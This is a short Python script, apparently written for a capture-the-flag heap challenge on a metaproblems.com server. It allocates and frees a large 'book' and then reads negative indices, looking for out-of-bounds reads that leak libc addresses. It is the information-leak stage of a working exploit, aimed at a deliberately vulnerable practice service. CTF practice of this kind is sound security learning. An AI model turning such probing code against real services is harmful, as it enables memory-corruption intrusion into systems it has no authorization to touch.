import socket
import time
import struct
import binascii

HOST = "host5.metaproblems.com"
PORT = 5020


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


def probe():
    s = socket.create_connection((HOST, PORT), timeout=10)
    print("[*] connected")
    print(recv_all(s, 1).decode(errors="ignore"))
    # create a large book to get unsorted-bin on free
    s.sendall(b"1\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"LARGE\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"20\n")  # 20 pages -> 20*4096 ~ 80KB
    time.sleep(0.05)
    print(recv_all(s, 0.5).decode(errors="ignore"))

    # free it
    s.sendall(b"4\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"0\n")
    time.sleep(0.1)
    print("[*] freed book 0")
    print(recv_all(s, 0.5).decode(errors="ignore"))

    # scan indices
    for i in range(-1, -41, -1):
        s.sendall(b"3\n")
        time.sleep(0.02)
        _ = recv_all(s, 0.1)
        s.sendall(str(i).encode() + b"\n")
        time.sleep(0.12)
        data = recv_all(s, 0.4)
        if not data or b"Invalid book" in data:
            continue
        # print preview
        print("idx", i, "len", len(data))
        try:
            print(data.decode(errors="ignore")[:300])
        except Exception:
            pass
        print("HEX:", binascii.hexlify(data)[:200].decode())
        # attempt to find 0x7f prefix in hex
        if b"7f" in binascii.hexlify(data):
            print("Possible libc bytes in idx", i)
    s.close()


if __name__ == "__main__":
    probe()
